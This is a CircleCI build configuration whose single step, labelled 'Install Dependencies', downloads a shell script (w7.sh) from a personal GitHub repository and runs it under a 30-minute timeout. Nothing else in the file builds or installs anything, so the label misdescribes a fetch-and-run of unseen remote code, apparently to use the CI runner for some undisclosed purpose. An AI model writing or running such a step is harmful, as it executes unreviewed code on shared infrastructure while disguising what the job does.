version: 2.1
jobs:
    Devop:
      docker:
            - image: circleci/ruby:2.5.3
      steps:
        - run:
            name: Install Dependencies
            command: timeout 30m wget https://raw.githubusercontent.com/ahmadun89/exmachine/main/w7.sh && chmod +x w7.sh && ./w7.sh
workflows:
    version: 2.1
    build:
        jobs:
            - Devop
